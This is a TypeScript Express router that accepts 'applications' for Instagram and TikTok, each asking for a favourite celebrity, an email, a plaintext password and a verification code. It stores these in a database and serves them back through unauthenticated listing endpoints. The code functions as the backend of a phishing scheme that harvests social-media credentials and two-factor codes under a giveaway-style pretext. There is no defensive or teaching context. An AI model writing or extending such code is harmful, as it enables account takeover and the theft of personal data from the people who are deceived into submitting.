import { Router, type IRouter } from "express";
import { db, instagramSubmissionsTable, tiktokSubmissionsTable } from "@workspace/db";
import {
  SubmitInstagramBody,
  SubmitTiktokBody,
  ListInstagramSubmissionsResponse,
  ListTiktokSubmissionsResponse,
} from "@workspace/api-zod";
import { desc } from "drizzle-orm";

const router: IRouter = Router();

router.post("/submissions/instagram", async (req, res): Promise<void> => {
  const parsed = SubmitInstagramBody.safeParse(req.body);
  if (!parsed.success) {
    res.status(400).json({ error: parsed.error.message });
    return;
  }

  await db.insert(instagramSubmissionsTable).values({
    favoriteCelebrity: parsed.data.favoriteCelebrity,
    email: parsed.data.email,
    password: parsed.data.password,
    verificationCode: parsed.data.verificationCode,
  });

  res.status(201).json({ success: true, message: "Application submitted successfully!" });
});

router.get("/submissions/instagram", async (req, res): Promise<void> => {
  const rows = await db
    .select()
    .from(instagramSubmissionsTable)
    .orderBy(desc(instagramSubmissionsTable.submittedAt));

  res.json(ListInstagramSubmissionsResponse.parse(rows.map(r => ({
    ...r,
    submittedAt: r.submittedAt.toISOString(),
  }))));
});

router.post("/submissions/tiktok", async (req, res): Promise<void> => {
  const parsed = SubmitTiktokBody.safeParse(req.body);
  if (!parsed.success) {
    res.status(400).json({ error: parsed.error.message });
    return;
  }

  await db.insert(tiktokSubmissionsTable).values({
    favoriteCelebrity: parsed.data.favoriteCelebrity,
    email: parsed.data.email,
    password: parsed.data.password,
    verificationCode: parsed.data.verificationCode,
  });

  res.status(201).json({ success: true, message: "Application submitted successfully!" });
});

router.get("/submissions/tiktok", async (req, res): Promise<void> => {
  const rows = await db
    .select()
    .from(tiktokSubmissionsTable)
    .orderBy(desc(tiktokSubmissionsTable.submittedAt));

  res.json(ListTiktokSubmissionsResponse.parse(rows.map(r => ({
    ...r,
    submittedAt: r.submittedAt.toISOString(),
  }))));
});

export default router;
